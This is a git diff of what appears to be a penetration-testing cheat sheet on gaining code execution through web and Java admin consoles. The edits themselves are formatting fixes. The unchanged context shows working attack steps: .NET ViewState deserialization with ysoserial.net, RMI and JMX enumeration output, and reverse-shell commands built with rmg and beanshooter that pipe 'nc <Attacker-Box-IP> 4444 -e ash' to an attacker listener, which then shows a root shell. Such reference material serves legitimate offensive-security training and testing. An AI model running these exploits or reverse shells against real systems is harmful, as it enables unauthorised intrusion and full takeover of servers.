@@ -7,8 +7,8 @@
 - [Technique 2 - Webshell upload using an APACHE TOMCAT manager Web console](#Technique-2-Webshell-upload-using-an-APACHE-TOMCAT-manager-Web-console)
 - [Technique 3 - Webshell upload using a JBOSS administration JMX Web console](#Technique-3-Webshell-upload-using-a-JBOSS-administration-JMX-Web-console)
 - [Technique 4 - Webshell upload using a WEBLOGIC administration console](#Technique-4-Webshell-upload-using-a-WEBLOGIC-administration-console)
-- [Technique 5 - Webshell upload using a SPLUNK Web administration console](#Technique-5-Webshell-upload-using-a-SPLUNK-administration-console)
-- [Technique 6- Webshell upload using a JIRA Web administration console](#Technique-6-Webshell-upload-using-a-JIRA-administration-console)
+- [Technique 5 - Webshell upload using a SPLUNK Web administration console](#Technique-5-Webshell-upload-using-a-SPLUNK-Web-administration-console)
+- [Technique 6- Webshell upload using a JIRA Web administration console](#Technique-6-Webshell-upload-using-a-JIRA-Web-administration-console)
 - [Technique 7 - Webshell upload using a WORDPRESS CMS Website admin console](#Technique-7-Webshell-upload-using-a-WORDPRESS-CMS-Website-admin-console)
 - [Technique 8 - Webshell upload using a DRUPAL CMS Website admin console](#Technique-8-Webshell-upload-using-a-DRUPAL-CMS-Website-admin-console)
 - [Technique 9 - Webshell upload using a KENTICO CMS Website admin console](#Technique-9-Webshell-upload-using-a-KENTICO-CMS-Website-admin-console)
@@ -639,7 +639,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 <i/>Usefull links: https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net and https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</i>
 ```
 Example 1 - Context: .Net framework < 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=false and a default/pre-shared machine key is used
-
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 ➤ Step 1. Use the tool 'blacklist3r.py' to detect if a pre-shared machine key is used by a target .NET Web application
            - Tool: https://github.com/NotSoSecure/Blacklist3r
            - python examples/blacklist3r.py --url https://target-website.com/any-web-page.aspx
@@ -666,7 +666,7 @@ Example 1 - Context: .Net framework < 4,5 and EnableViewStateMac=true and ViewSt
 ```
 ```
 Example 2 - Context: Any .Net framework version and EnableViewStateMac=False and ViewStateEncryptionMode=false
-
+--------------------------------------------------------------------------------------------------------------
 ➤ Step 1. Identify that both the ViewState MAC and encryption are disabled for a target .Net Web application using the Burp Web proxy
 
 ➤ Step 2. Generate a malicious (OS command) payload with the tool 'ysoserial.net'
@@ -677,7 +677,7 @@ Example 2 - Context: Any .Net framework version and EnableViewStateMac=False and
 ```
 ```
 Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=true and We have access to the 'web.config' file
-
+--------------------------------------------------------------------------------------------------------------------------------------------------
 ➤ Step 1. Get unauthorized access to the 'web.config' file of a .Net Web application by exploiting for example a file path traversal vulnerability 
            - Note: the validation and decryption keys and algorithms can be found within the machineKey section of the configuration file 'web.config' (or machine.config)
 
@@ -730,8 +730,6 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	       PORT      STATE SERVICE      VERSION
 	       1090/tcp  open  ssl/java-rmi Java RMI
 	       9010/tcp  open  java-rmi     Java RMI
-	       37471/tcp open  java-rmi     Java RMI
-	       40259/tcp open  ssl/java-rmi Java RMI
 	       <SNIP>
 
            + Example 2 - Nmap port scan with the NSE scripts: rmi-dumpregistry, rmi-vuln-classloader
@@ -771,9 +769,6 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+]   - legacy-service
 	     [+]     --> eu.tneitzel.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
 	     [+]         Endpoint: <FQDN>:42273 ObjID: [-49c48e31:17d6f8692ae:-7ffc, -2969569395601583761]
-	     [+]   - plain-server
-	     [+]     --> eu.tneitzel.rmg.server.interfaces.IPlainServer (unknown class)
-	     [+]         Endpoint: <FQDN>:42273 ObjID: [-49c48e31:17d6f8692ae:-7ff8, 1319708214331962145]
 	     [+]
 	     [+] RMI server codebase enumeration:
 	     [+]   - http://iinsecure.example/well-hidden-development-folder/
@@ -785,19 +780,9 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+]     --> The type java.lang.String is unmarshalled via readObject().
 	     [+]     Configuration Status: Outdated
 	     [+]
-	     [+] RMI server useCodebaseOnly enumeration:
-	     [+]   - Caught MalformedURLException during lookup call.
-	     [+]     --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
-	     [+]     Configuration Status: Non Default
-	     [+]
 	     [+] RMI registry localhost bypass enumeration (CVE-2019-2684):
 	     [+]   - Caught NotBoundException during unbind call (unbind was accepeted).
 	     [+]     Vulnerability Status: Vulnerable
-	     [+]
-	     [+] RMI Security Manager enumeration:
-	     [+]   - Security Manager rejected access to the class loader.
-	     [+]     --> The server does use a Security Manager.
-	     [+]     Configuration Status: Current Default
              <SNIP>
 
 
@@ -810,7 +795,6 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+] 	2550 methods were successfully parsed.
 	     [+]
 	     [+] Starting Method Guessing on 3281 method signature(s).
-	     [+]
 	     [+] 	MethodGuesser is running:
 	     [+] 		--------------------------------
 	     [+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
@@ -822,7 +806,6 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     [+] 	done.
 	     [+]
 	     [+] Listing successfully guessed methods:
-	     [+]
 	     [+] 	- plain-server2 == plain-server
 	     [+] 		--> String execute(String dummy)
 	     [+] 		--> String system(String dummy, String[] dummy2)
@@ -850,15 +833,11 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 
              $ rmg serial <TARGET-IP> <TARGET-PORT> CommonsCollections6 'nc <Attacker-Box-IP> 4444 -e ash' --component reg
              [+] Creating ysoserial payload... done.
-             [+]
              [+] Attempting deserialization attack on RMI Registry endpoint...
-             [+]
              [+] 	Caught ClassCastException during deserialization attack.
              [+] 	Deserialization attack was probably successful :)
 
              $ nc -vlp 4444
-             Ncat: Version 7.92 ( https://nmap.org/ncat )
-             Ncat: Listening on :::4444
              Ncat: Listening on 0.0.0.0:4444
              <SNIP>
              id
@@ -890,22 +869,17 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              //beanshooter standard <TARGET-IP> <TARGET-PORT> exec <CMD>
              $ beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'
              [+] Creating a TemplateImpl payload object to abuse StandardMBean
-             [+]
              [+] 	Deplyoing MBean: StandardMBean
              [+] 	MBean with object name de.qtc.beanshooter:standard=3873612041699 was successfully deployed.
-             [+]
              [+] 	Caught NullPointerException while invoking the newTransformer action.
              [+] 	This is expected bahavior and the attack most likely worked :)
-             [+]
              [+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
              [+] 	MBean was successfully removed.
              <SNIP>
 
              $ nc -vlp 4444
-             Ncat: Version 7.93 ( https://nmap.org/ncat )
-             Ncat: Listening on :::4444
-             Ncat: Listening on 0.0.0.0:4444
              <SNIP>
+             Ncat: Listening on 0.0.0.0:4444
              id
              uid=0(root) gid=0(root) groups=0(root)
 
